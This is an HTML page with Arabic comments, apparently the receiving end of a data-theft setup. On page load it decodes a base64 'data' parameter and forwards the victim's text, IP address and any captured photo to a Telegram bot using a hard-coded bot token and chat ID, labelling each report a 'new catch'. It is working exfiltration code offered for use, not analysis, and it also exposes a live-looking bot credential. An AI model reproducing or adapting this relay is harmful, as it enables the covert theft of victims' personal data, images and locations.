<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>V8 Central Receiver</title>
</head>
<body style="background:#000; color:#00ff00; font-family:monospace; text-align:center; padding-top:50px;">
    <h2>V8 GLOBAL - CENTRAL HUB</h2>
    <div id="status">جاري انتظار البيانات...</div>

    <script>
        // --- إعداداتك الثابتة ---
        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; // التوكن الخاص بك من الصورة
        const CHAT_ID = "7392262688"; 

        // دالة الاستقبال العالمية (هذا هو الرابط القوي)
        async function v8Receiver(data) {
            document.getElementById('status').innerText = "تم استلام بيانات جديدة!";
            
            let report = `🚀 صيد جديد من النظام الموحد:\n\n${data.text || 'لا توجد نصوص'}\n📍 IP: ${data.ip || 'Unknown'}`;
            
            // 1. إرسال النصوص
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
            });

            // 2. إرسال الصور (إذا كان الكود الخارجي سحب صورة)
            if (data.image) {
                let blob = await (await fetch(data.image)).blob();
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            }
        }

        // تحويل البيانات القادمة من "الكود الخارجي"
        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('data')) {
                let decodedData = JSON.parse(atob(urlParams.get('data')));
                v8Receiver(decodedData);
            }
        };
    </script>
</body>
</html>
